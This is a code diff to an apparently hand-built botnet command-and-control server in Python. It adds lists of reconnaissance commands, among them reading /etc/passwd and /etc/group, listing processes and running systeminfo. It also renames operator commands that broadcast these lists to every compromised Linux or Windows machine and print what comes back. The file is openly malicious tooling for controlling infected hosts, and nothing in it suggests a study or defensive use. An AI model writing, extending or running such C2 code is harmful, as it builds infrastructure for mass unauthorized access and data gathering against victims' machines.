@@ -43,6 +43,10 @@ LINUX_CONNS = {} # Dict containing Linux machines IP addresses and corresponding
 WINDOWS_COUNT = 0 # Count for the number of Windows machines connected to our botnet.
 LINUX_COUNT = 0 # Count for the number of Linux machines connected to our botnet.
 IP_ADDRESSES = [[],[]] # A list containing the IP addresses of both Lin/Win machines. Seperate lists.
+# A list containing the commands to gather general recon info for linux machines.
+AUTO_RECON_CMDS_LINUX = ['cat /etc/passwd', 'cat /etc/group', 'ps aux', 'df', 'top -b -n 1']
+# A list containing the commands to gather general recon info for windows machines.
+AUTO_RECON_CMDS_WIN = ['systeminfo', 'tasklist']
 
 # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 
@@ -232,10 +236,10 @@ class BotnetCmdCtrl:
 				index = int(cmd[11:].strip())
 				self.send_cmd_windows_target(index)
 
-			elif cmd.strip() == 'auto recon linux':
+			elif cmd.strip() == 'autorecon linux':
 				b = 0
-				while b < len(AUTO_RECON_CMD_LIST_LINUX):
-					command_to_send = AUTO_RECON_CMD_LIST_LINUX[b]
+				while b < len(AUTO_RECON_CMDS_LINUX):
+					command_to_send = AUTO_RECON_CMDS_LINUX[b]
 					resp_list = self.send_cmd_all_linux(command_to_send)
 					b += 1
 					i = 0
@@ -249,10 +253,10 @@ class BotnetCmdCtrl:
 							print((RED + output + RESET + '\n').replace(' ', ''))
 						i += 1
 
-			elif cmd.strip() == 'auto recon windows':
+			elif cmd.strip() == 'autorecon windows':
 				b = 0
-				while b < len(AUTO_RECON_CMD_LIST_WIN):
-					command_to_send = AUTO_RECON_CMD_LIST_WIN[b]
+				while b < len(AUTO_RECON_CMDS_WIN):
+					command_to_send = AUTO_RECON_CMDS_WIN[b]
 					resp_list = self.send_cmd_all_windows(command_to_send)
 					b += 1
 					i = 0
